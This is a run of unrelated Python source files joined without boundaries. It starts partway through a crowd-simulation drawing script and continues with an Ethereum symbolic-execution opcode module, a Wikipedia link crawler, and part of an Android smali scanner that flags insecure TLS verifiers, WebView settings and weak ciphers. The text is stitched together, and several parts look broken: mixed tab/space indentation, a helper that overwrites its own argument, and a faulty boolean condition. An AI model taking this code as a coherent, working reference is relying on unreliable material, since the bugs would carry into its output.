            road.append([[x,y,l,b,h]])
    settings.close()
    print agent                    
    print obstacle
    print building
    print road
    print triangle
    print polygon
    print POI
    draw_graphics()

    
def draw_graphics():
    print "graphics library"
    positions=[]
#     window=GraphWin("Crowd Simulation",width=1200, height=600)
    window=GraphWin("Crowd Simulation",width=400, height=400)                    
    window.setBackground('#636363')
    window.setCoords(0,0,40,40)                    

    for a in agent:
        val = Circle( Point(a[0][0],a[0][1]), a[0][2]-0.1)
        val.setFill("red")
        positions.append([a[0][0],a[0][1]])
        val.draw(window)
        a.append(val)
    
    for t in triangle:
        p1 = Point(t[0][0],t[0][1])
        p2 = Point(t[0][2],t[0][3])
        p3 = Point(t[0][4],t[0][5])
        poly = Polygon(p1,p2,p3)
        poly.setFill("#addd8e")
        poly.draw(window)
        t.append(poly)
    
    for p in polygon:
        p1 = Point(p[0][0],p[0][1])
        p2 = Point(p[0][2],p[0][3])
        p3 = Point(p[0][4],p[0][5])
        p4 = Point(p[0][6],p[0][7])
        cent_x = (p[0][0] + p[0][2] + p[0][4] + p[0][6])/4.0
        cent_y = (p[0][1] + p[0][3] + p[0][5] + p[0][7])/4.0
        poly = Polygon(p1,p2,p3,p4)
        poly.setFill("#bf78ce")
        poly.draw(window)
        if p[0][8] == "River":
            poly.setFill("#99d8c9")
        text = Text(Point(cent_x,cent_y),p[0][8])
        text.setSize(8)
        text.draw(window)
        p.append(poly)
    
    for a in building:
        bd1 = Point(a[0][0], a[0][1])
#         bd2 = Point(a[0][0], a[0][1] + a[0][2])
        bd3 = Point(a[0][0] + a[0][3], a[0][1] + a[0][2])
#         bd4 = Point(a[0][0] + a[0][3], a[0][1])

        #Line(bd1,bd2).draw(window)
        #Line(bd2,bd3).draw(window)
        #Line(bd3,bd4).draw(window)
        #Line(bd4,bd1).draw(window)
        
        rect = Rectangle(bd1,bd3)
        if "College" == str(a[0][4]):
            color = 'Brown'
        elif 'Hospital' == str(a[0][4]):
            color = 'Blue'
        elif "Forest" == str(a[0][4]):
            color = "Green"
        elif "Pub" == str(a[0][4]):
            color = "Yellow"
        elif "Home" == str(a[0][4]):
            color = "White"
        elif "Office" == str(a[0][4]):
            color = "Magenta"
        elif "Gym" == str(a[0][4]):
            color = "Maroon"
        elif "Pool" == str(a[0][4]):
            color = "cyan"
        elif "Park" == str(a[0][4]):
            color = "Green"
        elif "Hostel" == str(a[0][4]):
            color = "Yellow"
        elif "Bridge" == str(a[0][4]):
            color = "Brown"
        elif "Mall" == str(a[0][4]):
            color = "#5ab4ac"
        elif "Restaurant" == str(a[0][4]):
            color = "#d8b365"
        else:
            color = "#addd8e"
        rect.setFill(color)
        rect.draw(window)
        anchorPoint = rect.getCenter()
        text = Text(anchorPoint, a[0][4])
        text.setSize(8)
        text.draw(window)
        a.append(rect)
#     time.sleep(10)

    for r in road:
        r1= Point(r[0][0],r[0][1])
        r2 = Point(r[0][0] + r[0][3],r[0][1]+r[0][2])
        rd = Rectangle(r1,r2)
        rd.setFill("#636363")
        rd.setOutline("#636363")
        rd.draw(window)
        r.append(rd)

    for o in obstacle:
        val = Circle( Point(o[0][0],o[0][1]), o[0][2])
        type = o[0][3]
        if type == "road":
            val.setFill("#636363")
            val.setOutline("#636363")
        else:
            val.setFill("black")
        val.draw(window)
        o.append(val)
    for poi in POI:
        poi1 = Point(poi[0][0], poi[0][1])
        poi2 = Point(poi[0][0] + 5, poi[0][1] + 5)                    
        rct_poi = Rectangle(poi1,poi2)
        rct_poi.setFill("Red")
        rct_poi.draw(window)
        text = Text(rct_poi.getCenter(),poi[0][2])
        text.setSize(8)
        text.draw(window)
    matrix = []
    for x in range(0,40,5):
        m1 = []
        for y in range(0,40,5):
            m1.append((x*8 + y)/5)
            rP = Rectangle(Point(x,y),Point(x+5,y+5))
            rP.setOutline("black")
            rP.draw(window)
            t = Text(rP.getCenter(),(x*8 + y)/5)
            t.setSize(8)
            t.draw(window)
        matrix.append(m1)
    
    for i in range(0,8):
        for j in range(0,8):
            print str(matrix[i][j])  + " ",
        print "\n"
    dim = 4                    
    a = []
    for l in range(0,dim):
        b = []
        for m in range(0,dim):
            b.append(l*dim+m)                    
        a.append(b)
        
    print a                    
    path = []
    traverSeMatrix(a,0,0,dim,dim,path)       
    traverserMatrixDP(a)
    
            
    try: 
        file = open(framepath)
    except TypeError:
        print "cannot find frame file"
    file.readline()
    while True:
        line = file.readline()
        if line=="":
            break;
        line = line.split()
        i= int(line[0])
        newpos = [float(line[1]),float(line[2])]
        dpos = [newpos[0]-positions[i][0],newpos[1]-positions[i][1]]
        agent[i][1].move(dpos[0],dpos[1])
        positions[i]=newpos
        time.sleep(0.1)
    file.close()
    window.getMouse()
draw()


import helpers
import ctypes
from symbolicinput import SymbolicInput
from math import copysign

################### JUMP OPS #####################

def handleJumpOps(op, stack, items, symbols, symId):
  adr = stack.pop()
  out = (-1, False)
  if op == "JUMP":
    #jump to adr
    return jumpToLoc(adr, items)
    # if adr < 0:
    #   symbAdrJump(adr, 'Jump')
    # else:
    #   return jumpToLoc(adr, items)
  if op == "JUMPI":
    cond = stack.pop()
    if cond > 0:
      return jumpToLoc(adr, items)
    elif cond < 0:
      return symbAdrJump(cond, adr, symbols, items, symId)
  return out

def symbAdrJump(condition, address, symbols, items, symId):
  # if condition is symbolic, need to split paths
  sym = symbols[condition]
  del symbols[condition]
  # same for both paths
  x = SymbolicInput(symId[0], "IsZero", sym, address)
  symbols[symId[0]] = x
  symId[0] -= 1
  # tell path to split
  return (x.getId(), jumpToLoc(address, items)), -1

def makeJump(x, symbols, symId):
  # i.e. condition is not zero
  # new symbol mapping, because
  sym = symbols[x]
  del symbols[x]
  newSym = SymbolicInput(symId[0], "Not", sym)
  symbols[symId[0]] = newSym
  symId[0] -= 1

def jumpToLoc(adr, items):
  try:
    x = int(adr, 16)
  except TypeError:
    return -1, False
  return x, not isValidJumpTarget(x, items)

def isValidJumpTarget(loc, items):
  return loc not in invalidTargets and \
         helpers.convert(items[loc][0])[0] == "JUMPDEST"

invalidTargets = [2]

############### ARITHMETIC OPS #################

def handleArithOps(item, stack, symbols, symId):
  params = []
  for i in range(item[1]):
    p = stack.pop()
    if p >= 0:
      params.insert(0, int(p, 16))                    
    else:
      params.insert(0, p)                    
  if params[0] > 0 and params[1] > 0:                    
    # if there are 3 params and the 3rd one is a symbol
    if len(params) == 3 and params[2] < 0:
      func = arithMapSym[item[0]]
      stack.append(func(params, symbols, symId))
    else:
      func = arithMap[item[0]]
      stack.append(helpers.toHex(func(params)))
  else:
    func = arithMapSym[item[0]]
    stack.append(func(params, symbols, symId))

def signedDiv(params, symbols, symId = -1):
  x = params[0]
  y = params[1]
  if not y:
    return y
  elif x == -(2**255) and y == -1:
    return -(2**255)
  else:
    return copysign(abs(x / y), x / y)

def signedMod(params, symbols, symId = -1):
  x = params[0]
  y = params[1]
  if y:
    return copysign(abs(x) % abs(y), x)
  return y

# need to check if this works
def signExtend(params, symbols, symId = -1):
  x = params[0]
  i = params[1]
  sign_bit = 1 << (i - 1)
  return (x & (sign_bit - 1)) - (x & sign_bit)

# Simple 2 argument operations involving symbols
def param2Simple(op, params, symbols, symId):
  if params[0] < 0:
    p0 = symbols[params[0]]
    del symbols[params[0]]
  else:
    p0 = params[0]

  if params[1] < 0:
    p1 = symbols[params[1]]
    del symbols[params[1]]
  else:
    p1 = params[1]

  x = SymbolicInput(symId[0], op, p0, p1)
  symbols[symId[0]] = x
  symId[0] -= 1
  return x.getId()

def param1Simple(op, params, symbols, symId):
  if params[0] < 0:
    p0 = symbols[params[0]]
    del symbols[params[0]]
  else:
    p0 = params[0]

  x = SymbolicInput(symId[0], op, p0, None)
  symbols[symId[0]] = x
  symId[0] -= 1
  return x.getId()

# Functions that take in 3 args for mods: add mod and mul mod
def mod3Arith(op, params, symbols, symId):

  # Get result of first operation
  if params[0] or params[1] < 0:
    sid = param2Simple(op, params[:2], symbols)
    p1p2 = symbols[sid]
    del symbols[sid]
  else:
    p1p2 = arithMap[op](params[:1])

  if params[2] < 0:
    p3 = symbols[params[2]]
    del symbols[params[2]]
  else:
    p3 = params[2]

  x = SymbolicInput(symId[0], 'Mod', p1p2, p3)
  symbols[symId[0]] = x
  symId[0] -= 1
  return x.getId()

# If no symbols
arithMap = {
  "ADD":        lambda params: params[0] + params[1],
  "MUL":        lambda params: params[0] * params[1],
  "SUB":        lambda params: params[0] - params[1],
  "DIV":        lambda params: params[0] / params[1] if params[1] else 0,
  "MOD":        lambda params: params[0] % params[1] if params[1] else 0,
  "ADDMOD":     lambda params: (params[0] + params[1]) % params[2] if params[2] else 0,
  "MULMOD":     lambda params: (params[0] * params[1]) % params[2] if params[2] else 0,
  "EXP":        lambda params: params[0] ** params[1],
  "SDIV":       signedDiv,
  "SMOD":       signedMod,
  "SIGNEXTEND": signExtend
}

# If there's a symbol
arithMapSym = {
  "ADD":        lambda params, symbols, symId: param2Simple('Add', params, symbols, symId),
  "MUL":        lambda params, symbols, symId: param2Simple('Mul', params, symbols, symId),
  "SUB":        lambda params, symbols, symId: param2Simple('Sub', params, symbols, symId),
  "DIV":        lambda params, symbols, symId: param2Simple('Div', params, symbols, symId),
  "MOD":        lambda params, symbols, symId: param2Simple('Mod', params, symbols, symId),
  "ADDMOD":     lambda params, symbols, symId: mod3Arith('Add', params, symbols, symId),
  "MULMOD":     lambda params, symbols, symId: mod3Arith('Mul', params, symbols, symId),
  "EXP":        lambda params, symbols, symId: param2Simple('Exp', params, symbols, symId),
  "SDIV":       signedDiv,
  "SMOD":       signedMod,
  "SIGNEXTEND": signExtend
}

############### BOOLEAN OPS #################

def makeUnsigned256(i):
    return ctypes.c_ubyte(i).value

def handleBoolOp(item, stack, symbols, symId):
  params = []
  for i in range(item[1]):
    p = stack.pop()
    if p >= 0:
      params.insert(0, int(p, 16))                    
    else:
      params.insert(0, p)                    

  # if only one arg
  if len(params) == 1:
    if params[0] < 0:
      func = boolMapSym[item[0]]
      stack.append(func(params, symbols, symId))
    else:
      func = boolMap[item[0]]
      stack.append(helpers.toHex(func(params)))
  elif params[0] >= 0 and params[1] >= 0: # 2 nonsymbolic args
    func = boolMap[item[0]]
    stack.append(helpers.toHex(func(params)))
  else:
    func = boolMapSym[item[0]]
    stack.append(func(params, symbols, symId))

def ltgt(op, params, symbols, symId):
  if params[0] < 0:
    p0 = symbols[params[0]]
    del symbols[params[0]]
  else:
    p0 = params[0]
    makeUnsigned256(p0)

  if params[1] < 0:
    p1 = symbols[params[1]]
    del symbols[params[1]]
  else:
    p1 = params[1]
    makeUnsigned256(p1)

  x = SymbolicInput(symId[0], op, p0, p1)
  symbols[symId[0]] = x
  symId[0] -= 1
  return x.getId()

# Boolmap for normal operations
boolMap = {
  "LT":     lambda params: makeUnsigned256(params[0]) < makeUnsigned256(params[1]),
  "GT":     lambda params: makeUnsigned256(params[0]) > makeUnsigned256(params[1]),
  "SLT":    lambda params: params[0] < params[1],
  "SGT":    lambda params: params[0] > params[1],
  "EQ":     lambda params: params[0] == params[1],
  "ISZERO": lambda params: not params[0],
  "AND":    lambda params: params[0] & params[1],
  "OR":     lambda params: params[0] | params[1],
  "XOR":    lambda params: params[0] ^ params[1],
  "NOT":    lambda params: params[0],
  "BYTE":   lambda params: (params[1] >> (8 * params[0])) & 0xFF
}

# Boolmap for operations with symbols
boolMapSym = {
  "LT":     lambda params, symbols, symId: ltgt('Lt', params, symbols, symId),
  "GT":     lambda params, symbols, symId: ltgt('Gt', params, symbols, symId),
  "SLT":    lambda params, symbols, symId: params[0] < params[1], #TODO
  "SGT":    lambda params, symbols, symId: params[0] > params[1], #TODO
  "EQ":     lambda params, symbols, symId: param2Simple('Eq', params, symbols, symId),
  "ISZERO": lambda params, symbols, symId: param1Simple('IsZero', params, symbols, symId),
  "AND":    lambda params, symbols, symId: param2Simple('And', params, symbols, symId),
  "OR":     lambda params, symbols, symId: param2Simple('Or', params, symbols, symId),
  "XOR":    lambda params, symbols, symId: param2Simple('Xor', params, symbols, symId),
  "NOT":    lambda params, symbols, symId: param1Simple('Not', params, symbols, symId),
  "BYTE":   lambda params, symbols, symId: (params[1] >> (8 * params[0])) & 0xFF #TODO
}

################ ENVIRONMENTAL OPS ##############

def handleEnvOps(item, stack, memory, symbols, userIn, symId):
  #func = envMap[item[0]]
  params = []
  for i in range(item[1]):
    p = stack.pop()
    if p >= 0:
      params.insert(0, int(p, 16))                    
    else:
      params.insert(0, p)                    
  if item[2] == 1:
    x = SymbolicInput(symId[0], 'id', None)
    symbols[symId[0]] = x
    stack.append(symId[0])
    userIn.append(symId[0])
    symId[0] -= 1
  #stack.append(helpers.toHex(func(params)))

############### DUP #############

def handleDupOp(op, symbols, stack, symId):
  num = int(op[3:])
  val = stack[-num]
  if val < 0:
    sym = symbols[val]
    x = SymbolicInput(symId[0], 'Dup', sym)
    symbols[symId[0]] = x
    symId[0] -= 1
  else:
    stack.append(val)                    

################ BLOCK OPS #################

def handleBlockOps(item, stack, symbols):
  pass
  # func = envMap[item[0]]
  # params = []
  # for i in range(item[1]):
    # params.insert(0, int(stack.pop(), 16))
  # stack.append(helpers.toHex(func(params)))

################ MEMORY OPS ##############

def handleMemoryOps(item, stack, memory, symbols):
  pass
  # func = envMap[item[0]]
  # params = []
  # for i in range(item[1]):
    # params.insert(0, int(stack.pop(), 16))
  # stack.append(helpers.toHex(func(params)))

################ STORAGE OPS ##############

def handleStorageOps(item, stack, storage, symbols, userIn):
  pass
  # func = envMap[item[0]]
  # params = []
  # for i in range(item[1]):
    # params.insert(0, int(stack.pop(), 16))
  # stack.append(helpers.toHex(func(params)))


#############################################

from bs4 import BeautifulSoup
from bs4.element import NavigableString, Tag
import requests
import time


class WikiCrawler:
    def __init__(self, wiki):
        self.MAX_P_CHECKS = 5
        self.MAX_CRAWLS = 1
        self.MAX_PATH_LENGTH = 50
        self.TARGET = "Philosophy"
        self.DOMAIN = "https://en.wikipedia.org"
        self.start_wiki = "Special:Random" if not wiki else wiki
        self.path_lengths = []
        self.wiki_to_target_length = {}
        self.completed_path = 0
        self.invalid_path = 0

    def build_url(self, wiki_topic, add_wiki_text):
        if add_wiki_text:
            url = self.DOMAIN + '/wiki/' + wiki_topic
        else:
            url = self.DOMAIN + wiki_topic
        return url

    def parse_tag(self, tag):
        next_wiki = None
        contents = tag.contents
        stack = []
        for element in contents:
            # Keeps track of balanced parenthesis to
            # ensure no links that are within them
            # are used. Since closing parenthesis
            # may be within the same string, pop
            # must be checked immediately
            if isinstance(element, NavigableString):
                if '(' in element:
                    stack.append('(')
                if ')' in element:
                    stack.pop()
            # Checks to see if the stack is empty
            # meaning now outside of the parenthesis
            # and can check if a link
            if isinstance(element, Tag) and not stack:
                a_tag = element
                if not getattr(element, 'name', None) == 'a':
                    a_tag = element.find('a')                    
                if self.is_valid(a_tag):
                    return a_tag.attrs['href']
        return next_wiki

    def parse_html(self, div):
        # Likely to find the first link in paragraphs. A limit
        # is placed on the number of paragraphs to check since
        # it's also likley the link is in the initial paragraphs.
        p_tags = div.find_all('p', not {'class': 'mw-empty-elt'},
                              recursive=False, limit=self.MAX_P_CHECKS)
        for p in p_tags:
            next_wiki = self.parse_tag(p)
            if next_wiki:
                return next_wiki

        # To handle cases that the link may not be in a paragraph
        # but in bullets
        ul = div.find('ul', recursive=False)
        next_wiki = self.parse_tag(ul)

        return next_wiki

    def crawler(self):

        cycle_check = set()
        path = []
        path_length = 0
        print("\nStart")
        url = self.build_url(self.start_wiki, True)
        session = requests.Session()

        while path_length < self.MAX_PATH_LENGTH:

            html = session.get(url)
            soup = BeautifulSoup(html.content, 'lxml')

            title = soup.find('h1', {"id": "firstHeading"})
            wiki_topic = url.split("/wiki/")[1]
            print(title.getText())                    

            if title.getText() == self.TARGET:
                self.path_lengths.append(path_length)
                return True

            div = soup.find('div', {'class': 'mw-parser-output'})
            wiki = self.parse_html(div)                    

            # Might lead to a dead end (no links to follow) or
            # a cycle (first eventually links back to a wiki
            # page already visited
            if not wiki or wiki in cycle_check:                    
                self.invalid_path += 1                    
                return False

            cycle_check.add(wiki)                    
            wiki_topic = wiki.split("/wiki/")[1]                    
            path.append(wiki_topic)
            url = self.build_url(wiki, False)                    
            path_length += 1                    

            time.sleep(1)

        return False

    # Iterates over crawler for the max number of crawls
    # while not taking into account invalid paths - dead ends
    # or cycles
    def crawl(self):
        while self.completed_path < self.MAX_CRAWLS:
            if self.crawler():
                self.completed_path += 1
            else:
                self.invalid_path += 1                    
            print()

    @staticmethod
    def is_valid(element):
        tags = ['sup', 'i', 'span']
        return getattr(element, 'name', None) == 'a' \
               and getattr(element.parent, 'name', None) not in tags \
               and not element.has_attr('style')


if __name__ == '__main__':
    wiki = "Art"                    
    crawler = WikiCrawler(wiki)
    crawler.crawl()

import re
from Configuration import *
from subprocess import *
from sys import platform


class NotFound(Exception):
    """Object not found in source code"""

class SmaliChecks:

    smaliPaths = []
    vulnerableTrustManagers=[]
    vulnerableWebViewSSLErrorBypass=[]
    vulnerableSetHostnameVerifiers = []
    vulnerableHostnameVerifiers = []
    vulnerableSocketsLocations = []
    dynamicRegisteredBroadcastReceiversLocations = []
    encryptionFunctionsLocation = []
    decryptionFunctionsLocation = []
    undeterminedCryptographicFunctionsLocation = []
    keystoreLocations = []
    webViewLoadUrlUsageLocation = []
    webViewAddJavascriptInterfaceUsageLocation = []
    okHttpCertificatePinningLocation = []
    customCertifificatePinningLocation = []
    AESwithECBLocations = []
    DESLocations =[]
    javascriptEnabledWebviews = []
    fileAccessEnabledWebviews = []
    universalAccessFromFileURLEnabledWebviewsLocations = []
    customChecksLocations = {}
    configuration = Configuration()

    def __init__(self, paths):
        for path in paths:
            self.smaliPaths.append(path)
        self.checkWebviewSSLErrorBypass()
        self.findWebviewJavascriptInterfaceUsage()
        self.findWeakCryptographicUsage()
        self.checkVulnerableTrustManagers()
        self.checkInsecureHostnameVerifier()
        self.checkVulnerableSockets()
        self.findEncryptionFunctions()
        self.checkVulnerableHostnameVerifiers()
        self.findWebViewLoadUrlUsage()
        self.findCustomChecks()
        self.findPropertyEnabledWebViews()
        self.checkOKHttpCertificatePinning()
        self.checkCustomPinningImplementation()
        self.findKeystoreUsage()
        self.findDynamicRegisteredBroadcastReceivers()
        self.findPathTraversalContentProvider()

    def getSmaliPaths(self):
        return self.smaliPaths

    def getOSGnuGrepCommand(self):
        if platform == "darwin":
            return "ggrep"
        else:
            return "grep"


    def checkForExistenceInFolder(self,objectRegEx,folderPath):
        command = [self.getOSGnuGrepCommand(),"-s" ,"-r", "-l", "-P",objectRegEx," --exclude-dir="+self.configuration.getFolderExclusions()]
        for path in folderPath:
            command.append(path)
        grep = Popen(command, stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            raise NotFound

    def existsInFile(self,objectRegEx,filePath):
        grep = Popen([self.getOSGnuGrepCommand(),"-l", "-P",objectRegEx,filePath], stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            return False

    def getMethodCompleteInstructions(self,methodRegEx,filePath):
        sed = Popen(["sed", "-n", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        return methodContent.strip().replace('    ','').split('\n')

    def getFileContent(self,filePath):
        sed = Popen(["sed", "1p",filePath], stdout=PIPE)
        fileContent = sed.communicate()[0]
        return fileContent.strip().replace('    ', '').split('\n')

    def getMethodInstructions(self,methodRegEx,filePath):
        sed = Popen(["sed", "-n", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        try:
            match = re.search(r".locals \d{1,}([\S\s]*?).end method", methodContent)
            instructions = str(match.group(1)).strip().replace('    ','').split('\n')
            return instructions
        except:
            return ""

    def isMethodEmpty(self,instructions):
        for i in range(len(instructions)-1,0,-1):
            if instructions[i] == '.end method':
                continue
            else:
                if instructions[i] == "return-void":
                    return True
                else:
                    return False

    def hasOperationProceed(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if 'Landroid/webkit/SslErrorHandler;->proceed()V' in instructions[i]:
                return True
            else:
                continue
        return False

    def doesMethodReturnNull(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if instructions[i] == "return-object v0":
                if i-2 >= 0  and instructions[i-2] == "const/4 v0, 0x0":
                    return True
                elif i-2 >=0 and instructions[i-2] == "new-array v0, v0, [Ljava/security/cert/X509Certificate;":
                    if i-4 >= 0 and instructions[i - 4] == "const/4 v0, 0x0":
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                continue
        return False

    def doesMethodReturnTrue(self,instructions):
        maxLen = len(instructions)-1
        for i in range(maxLen, 0, -1):
            if instructions[i] == "return v0":
                if i-2 >= 0 and instructions[i-2] == "const/4 v0, 0x1":
                    return True
                else:
                    return False
            else:
                continue
        return False


    #Returns the register that has the target value assigned

    def searchRegisterByAssignedValue(self,instructions,value):
        register = ""
        for instruction in instructions:
            if "const/" in instruction and value in instruction:
                registerEnd = instruction.find(",")
                registerBegin = instruction.find(" ",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    #Returns the assigned value to the targer register.

    def getAssignedValueByRegister(self,instructions,register):
        register = ""
        for instruction in instructions:
            if "const/" in instruction and register in instruction:
                registerEnd = instruction.find(",")
                registerBegin = instruction.find(" ",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    def doesActivityExtendsPreferenceActivity(self,activity):
        activity = activity.replace(".","/")
        activityLocation = self.checkForExistenceInFolder(".class public([a-zA-Z\s]*)L"+activity+";",self.getSmaliPaths())
        if activityLocation[0] != "":
            preferenceExtends = self.existsInFile(".super Landroid\/preference\/PreferenceActivity;",activityLocation[0])
            if preferenceExtends[0] != '':
                return True
            else:
                return False

    def doesPreferenceActivityHasValidFragmentCheck(self,activity):
        activity = activity.replace(".","/")
        activityLocation = self.checkForExistenceInFolder(".class public([a-zA-Z\s]*)L"+activity+";",self.getSmaliPaths())
        if activityLocation[0] != "":
            isValidFragmentFunction = self.getMethodCompleteInstructions('/.method protected isValidFragment(Ljava\/lang\/String;)Z/,/^.end method/p',activityLocation[0])
            if isValidFragmentFunction[0] != '':
                return True
            else:
                return False

    def doesActivityHasFlagSecure(self,activity):
        activity = activity.replace(".","/")
	end = activity.rfind('/')+1
	customPath = []
        x = len(self.getSmaliPaths())
	for a in range(0,x):
		customPath.append(self.getSmaliPaths()[a]+activity[:end])
        activityLocation = self.checkForExistenceInFolder(".class public([a-zA-Z\s]*)L"+activity+";",customPath)
        if activityLocation[0] != "":
            methodInstructions = self.getMethodCompleteInstructions('/.method \([a-zA-Z]* \)onCreate(Landroid\/os\/Bundle;)V/,/^.end method/p',activityLocation[0])
            register = self.searchRegisterByAssignedValue(methodInstructions,"0x2000")
            if register.strip() == "":
		        return False
            else:
                flag = self.existsInFile("invoke-virtual.*"+register+".*Landroid\/view\/Window;->setFlags\(II\)V",activityLocation[0])
                if flag[0] != '':
                    return True
                else:
                    return False

    def findRegisterAssignedValueFromIndexBackwards(self,instructionsList,register,index):
        for pointer in range(index,0,-1):
            if register in instructionsList[pointer] and ("const" in instructionsList[pointer] or "sget-object" in instructionsList[pointer]):
                valueBegin = instructionsList[pointer].find(",")
                value = instructionsList[pointer][valueBegin+2:]
                return value

    def findRegistersPassedToFunction(self,functionInstruction):
        match = re.search(r"{(.*)}", functionInstruction)
        try:
            if "range" in functionInstruction:
                registers = str(match.group(1)).strip().replace(' ', '').split("..")
            else:
                registers = str(match.group(1)).strip().replace(' ','').split(",")
        except:
            match = re.search(r"\D\d", functionInstruction)
            try:
                registers = str(match.group(0))
            except:
                return ""
        return registers

    def findInstructionIndex(self,instructionsList,instructionToSearch):
        indexList = []
        for index,instruction in enumerate(instructionsList):
            m = re.search(instructionToSearch,instruction)
            try:
                output = m.group(0)
                indexList.append(index)
            except:
                continue
        return indexList



    def findDynamicRegisteredBroadcastReceivers(self):
        dynamicRegisteredBroadcastReceiversLocations = self.checkForExistenceInFolder(
            ";->registerReceiver\(Landroid\/content\/BroadcastReceiver;Landroid\/content\/IntentFilter;\)",
            self.getSmaliPaths())
        for location in dynamicRegisteredBroadcastReceiversLocations:
            self.dynamicRegisteredBroadcastReceiversLocations.append(location)


    def findEncryptionFunctions(self):
        encryptionFunctionsLocations = self.checkForExistenceInFolder("invoke-virtual {(.*)}, Ljavax\/crypto\/Cipher;->init\(ILjava\/security\/Key",self.getSmaliPaths())
        if encryptionFunctionsLocations[0] != "":
            for location in encryptionFunctionsLocations:
                if "org/bouncycastle" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"Ljavax/crypto/Cipher;->init\(ILjava/security/Key")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == "0x1":
                            self.encryptionFunctionsLocation.append(location)
                        elif self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == "0x2":
                            self.decryptionFunctionsLocation.append(location)
                        else:
                            if location not in self.undeterminedCryptographicFunctionsLocation:
                                self.undeterminedCryptographicFunctionsLocation.append(location)

    def findKeystoreUsage(self):
        keystoreUsageLocations = self.checkForExistenceInFolder("invoke-virtual {(.*)}, Ljava\/security\/KeyStore;->getEntry\(Ljava\/lang\/String;Ljava\/security\/KeyStore\$ProtectionParameter;\)Ljava\/security\/KeyStore\$Entry",self.getSmaliPaths())
        if keystoreUsageLocations[0] != "":
            for location in keystoreUsageLocations:
                self.keystoreLocations.append(location)

    def findWebViewLoadUrlUsage(self):
        webViewUsageLocations = self.checkForExistenceInFolder("Landroid\/webkit\/WebView;->loadUrl\(Ljava\/lang\/String;\)V",self.getSmaliPaths())
        if webViewUsageLocations[0] != "":
            for location in webViewUsageLocations:
                self.webViewLoadUrlUsageLocation.append(location)


    # *** Improper Platform Usage ***

    def findPathTraversalContentProvider(self):
        contentProvidersLocations = self.checkForExistenceInFolder(".super Landroid\/content\/ContentProvider;",self.getSmaliPaths())
        if contentProvidersLocations[0] != '':
            for location in contentProvidersLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,".method public openFile\(Landroid\/net\/Uri;Ljava\/lang\/String;\)Landroid\/os\/ParcelFileDescriptor;")                    
                if len(indexList) > 0:
                    indexList = self.findInstructionIndex(instructions,"Ljava\/io\/File;->getCanonicalPath\(\)")                    


    def findWeakCryptographicUsage(self):
        getInstanceLocations = self.checkForExistenceInFolder("Ljavax\/crypto\/Cipher;->getInstance\(Ljava\/lang\/String;\)Ljavax\/crypto\/Cipher;",self.getSmaliPaths())
        if getInstanceLocations[0] != '':
            for location in getInstanceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"Ljavax/crypto/Cipher;->getInstance\(Ljava/lang/String;\)Ljavax/crypto/Cipher;")
                for index in indexList:
		    register = self.findRegistersPassedToFunction(instructions[index])
                    transformationValue = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[0], index)
                    if transformationValue is not None:
                        if transformationValue == "\"AES\"" or "AES/ECB/" in transformationValue:
                            self.AESwithECBLocations.append(location)
                        elif "DES" in transformationValue:
                            self.DESLocations.append(location)


    def findPropertyEnabledWebViews(self):
        webviewUsageLocations = self.checkForExistenceInFolder(";->getSettings\(\)Landroid\/webkit\/WebSettings;",self.getSmaliPaths())
        if webviewUsageLocations[0] != '':
            for location in webviewUsageLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"Landroid/webkit/WebSettings;->setJavaScriptEnabled\(Z\)V")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions,register[1],index)
                        if value == "0x1":
                            self.javascriptEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,"Landroid/webkit/WebSettings;->setAllowFileAccess\(Z\)V")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == "0x1":
                            self.fileAccessEnabledWebviews.append(location)
                else:
                    self.fileAccessEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,"Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs\(Z\)V")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == "0x1":
                            self.universalAccessFromFileURLEnabledWebviewsLocations.append(location)



    def findWebviewJavascriptInterfaceUsage(self):
        javascriptInterfaceLocations = self.checkForExistenceInFolder(";->addJavascriptInterface\(Ljava\/lang\/Object;Ljava\/lang\/String;\)V",self.getSmaliPaths())
        if javascriptInterfaceLocations[0] != '':
            for location in javascriptInterfaceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,";->addJavascriptInterface\(Ljava/lang/Object;Ljava/lang/String;\)V")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                    self.webViewAddJavascriptInterfaceUsageLocation.append(location)


    # *** Insecure Communication Checks ***

    #Check for the implementation of custom HostnameVerifiers

    def checkInsecureHostnameVerifier(self):
        insecureHostNameVerifierLocations = self.checkForExistenceInFolder(".implements Ljavax\/net\/ssl\/HostnameVerifier;",self.getSmaliPaths())
        if insecureHostNameVerifierLocations[0] != '':
            for location in insecureHostNameVerifierLocations:
